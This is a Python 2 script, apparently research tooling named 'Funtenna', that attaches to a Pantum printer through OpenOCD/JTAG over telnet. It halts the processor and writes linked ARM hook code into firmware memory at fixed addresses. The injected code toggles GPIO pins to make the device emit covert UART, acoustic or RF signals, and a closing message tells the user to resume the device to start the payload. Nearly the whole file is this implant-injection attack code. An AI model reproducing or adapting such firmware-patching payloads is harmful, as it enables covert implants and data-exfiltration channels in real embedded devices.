import argparse
import telnetlib
import subprocess
import time
import os
from ocd_interface import OcdInterface

PWNIE = './pantum.dump'
ENDIAN = 'little'
ARCH = 'arm'
UART_OCD = 'uart_ocd.dump'
ACOUSTIC_OCD = 'acoustic_ocd.dump'
RF_OCD = 'RF_OCD_ocd.dump'
LINKER = '/usr/local/bin/arm-none-eabi-ld'
print "Make sure you change LINKER in printer_jam.py if it isn't %s" % (LINKER)
SPLITTER = '\x0E\xE0\xA0\xE1\x00\xF0\x20\xE3\x0E\xE0\xA0\xE1\x00\xF0\x20\xE3'
ARGS = [
    {
        'args': ('--action', '-a'),
        'kwargs': {
            'type': str,
            'required': True,
            'help': ("tell me how to jam: uart, acoustic, emanate")
        },
    },
    {
        'args': ('--pwnie', '-f'),
        'kwargs': {
            'type': str,
            'default': PWNIE,
            'help': ("pwnie to jam with")
        },
    },
    {
        'args': ('--host', '-H'),
        'kwargs': {
            'type': str,
            'required': True,
            'help': ("OCD HOST")
        },
    },
    {
        'args': ('--port', '-p'),
        'kwargs': {
            'type': str,
            'required': True,
            'help': ("OCD PORT")
        },
    },
]


def link_code(vmaddr, assembled_output):
    assembled_output = os.path.abspath(assembled_output)
    endian_flag = '-EL'
    vmaddr -= 0x10
    linked_file = assembled_output + '-linkd'
    flags = [endian_flag, '-e', hex(vmaddr), '-Ttext', hex(vmaddr), '-s', '-o',
             linked_file, assembled_output]
    ld_cmd = ' '.join([LINKER] + flags)
    print ld_cmd
    subprocess.check_output(ld_cmd, shell=True)
    return strip(linked_file)


def strip(obj_file):
    """ slice code"""
    with open(obj_file, 'rb') as handle:
        data = bytearray(handle.read())
    sections = data.split(SPLITTER)
    return str(sections[1])


class Meat():
    def __init__(self, filename):
        """get meat"""
        with open(filename, 'rb') as handle:
            self.meat = bytearray(handle.read())

    def patch(self, offset, data):
        """patch code"""
        patch_size = len(data)
        self.meat = self.meat[:offset] + data + self.meat[offset + patch_size:]


def toggle_uart(ocd_client, meat):
    """toggles uart
    """
    pantumhook_addr = 0x0049AD98
    pantumhook_sensorcmd = link_code(pantumhook_addr, './pantumhook_sensorcmd.o')
    ocd_client.write_data(pantumhook_addr, str(pantumhook_sensorcmd))
    gpio_uart_addr = 0x03C1644
    gpio_uart = link_code(gpio_uart_addr, './pantum_gpio_uart_onoff.o')
    ocd_client.write_data(gpio_uart_addr, str(gpio_uart))


def null_space():
    pass


def generate_acoustic_sound(ocd_client, meat):
    """generates acoustic sound
    """
    null_out_addr = 0x3c1540
    ocd_client.write_data(null_out_addr, '\x00' * 0x220)

    gpio_bank_addr = 0x3c1860
    with open('./bank_0_3.cfgbin', 'rb') as handle:
        bank_data = handle.read()
    ocd_client.write_data(gpio_bank_addr, bank_data)

    pantumhook_addr = 0x00492474
    pantumhook_sensorcmd = link_code(pantumhook_addr, './pantumhook_sensorcmd.o')
    ocd_client.write_data(pantumhook_addr, str(pantumhook_sensorcmd))

    gpio_ac_addr = 0x03C1644
    gpio_ac = link_code(gpio_ac_addr, './pantum_gpio_push_acoustic.o')
    ocd_client.write_data(gpio_ac_addr, str(gpio_ac))


def toggle_everything(ocd_client, meat):
    """toggles every motherfucking gpio
    """
    null_out_addr = 0x3c1540
    ocd_client.write_data(null_out_addr, '\x00' * 0x220)

    gpio_bank_addr = 0x3c1860
    with open('./bank_0_3.cfgbin', 'rb') as handle:
        bank_data = handle.read()
    ocd_client.write_data(gpio_bank_addr, bank_data)

    pantumhook_addr = 0x0049AD98
    pantumhook_sensorcmd = link_code(pantumhook_addr, './pantumhook_sensorcmd.o')
    ocd_client.write_data(pantumhook_addr, str(pantumhook_sensorcmd))

    gpio_sens_addr = 0x03C1644
    gpio_sens = link_code(gpio_sens_addr, './pantum_gpio_push_sensors.o')
    ocd_client.write_data(gpio_sens_addr, gpio_sens)

    pantum_hook_addr = 0x475fa8
    pantum_hook = link_code(pantum_hook_addr, './pantumhook.o')
    ocd_client.write_data(pantum_hook_addr, pantum_hook)

    pantum_patch_addr = 0x3c1544
    pantum_patch = link_code(pantum_patch_addr, './pantumpatch.o')
    ocd_client.write_data(pantum_patch_addr, pantum_patch)

    pantum_ret_addr = 0x3c1640
    pantum_ret = link_code(pantum_ret_addr, './pantumreturn.o')
    ocd_client.write_data(pantum_ret_addr, pantum_ret)


JAM_SESSION = {
    'uart': toggle_uart,
    'acoustic': generate_acoustic_sound,
    'rf': toggle_everything,
}
PANTUM_FILE = 'pantum.dump'


def jtag_trigger(host, port, cmds):
    """ send jtag cmds to a particular port """
    tn = telnetlib.Telnet(host, port)
    for cmd in cmds:
        print cmd
        tn.write("%s\n" % (cmd))
    tn.close()


def main(args):
    """ DO the JAM"""
    jtag_trigger(args.host, args.port, ['reset'])
    time.sleep(6)
    jtag_trigger(args.host, args.port, ['halt'])
    ocd_client = OcdInterface(args.host, int(args.port))
    meat = Meat(PANTUM_FILE)
    JAM_SESSION[args.action](ocd_client, meat)
    jtag_trigger(args.host, args.port, ['halt'])


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Funtenna")
    for arg in ARGS:
        parser.add_argument(*arg['args'], **arg['kwargs'])
    args = parser.parse_args()
    main(args)
    print "Now manually resume device over OpenOCD to start the payload"
